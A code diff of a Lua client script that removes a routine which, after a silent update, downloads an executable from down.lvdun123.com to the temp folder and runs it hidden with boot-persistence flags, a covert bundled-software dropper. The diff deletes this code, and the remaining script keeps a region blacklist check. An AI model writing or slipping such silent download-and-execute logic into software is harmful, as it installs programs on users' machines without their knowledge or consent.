@@ -37,56 +37,6 @@ function FetchValueByPath(obj, path)
 	return cursor
 end
 
-
---------------------------GSBussiness---
-function DoGSBussiness()
-	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
-	if not bRet or strSource ~= "installfinish" then
-		return
-	end
-
-	local bRet, strInsMethod = FunctionObj.GetCommandStrValue("/installmethod")
-	if not bRet or strInsMethod ~= "silent" then
-		return
-	end
-	
-	local bRet, strInsMethod = FunctionObj.GetCommandStrValue("/installtype")
-	if not bRet or strInsMethod ~= "update" then
-		return
-	end
-
-	local strGSPath = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\GreenShield\\Path")
-	if IsRealString(strGSPath) and tipUtil:QueryFileExists(strGSPath) then
-		return 
-	end
-	
-	DownLoadGS()
-end
-
-
-function DownLoadGS()
-	local strPacketURL = "http://down.lvdun123.com/client/GsSetup_0006.exe"
-	local strSaveDir = tipUtil:GetSystemTempPath()
-	local strSavePath = tipUtil:PathCombine(strSaveDir, "GsSetup_0006.exe")
-	
-	local strStamp = FunctionObj.GetTimeStamp()
-	local strURLFix = strPacketURL..strStamp
-	
-	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false
-	, function(bRet, strRealPath)
-			FunctionObj.TipLog("[DownLoadGS] bRet:"..tostring(bRet)
-					.." strRealPath:"..tostring(strRealPath))
-					
-			if 0 ~= bRet then
-				return
-			end
-			
-			local strCmd = "/s /run /setboot"
-			tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
-	end)
-end
-
-
 ---------------------------AiSvcsBussiness-----
 function CheckIsInZone(strProvince,strCity, tBlackCity)
 	local tabProvinceInclude = {}
@@ -354,11 +304,7 @@ function main()
 		or apiAsyn == nil then
 		return
 	end
-	
-	--DoGSBussiness()
 	DoAiSvcsBussiness()
 end
 
 main()
-
-
